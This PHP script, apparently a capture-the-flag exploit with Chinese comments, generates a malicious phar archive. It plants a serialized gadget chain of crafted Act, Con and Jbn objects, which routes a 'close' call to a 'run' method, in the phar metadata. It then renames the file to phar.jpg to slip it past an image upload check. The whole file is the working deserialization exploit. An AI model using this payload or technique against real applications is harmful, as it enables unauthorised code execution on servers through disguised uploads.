<?php

class Act {
    protected $checkAccess;
    protected $id; 
    public function __construct($checkAccess, $id)
    {
        $this->checkAccess = $checkAccess;
        $this->id = $id;
    }
}

class Con {
    public $formatters;//数组 array('close'=>array(new Action(), 'run'))

    public function __construct($formatters)
    {
        $this->formatters = $formatters;
    }
    
}

class Jbn{
    public $source;
    public $str;
    public $reader;
    public function __construct($source, $str, $reader) {
        $this->source = $source;
        $this->str = $str;
        $this->reader = $reader;
    }
}

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$action = new Act('', '0');
$formatters = array('close' => array($action, 'run'));
$read = new Con($formatters);
$str = new Jbn('', '', $read);
$show1 = new Jbn('', $str, '');
$show0 = new Jbn($show1, '', '');

$phar->setMetadata($show0); //将自定义的meta-data存入manifest
$phar->addFromString("test.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
rename("./phar.phar", "./phar.jpg");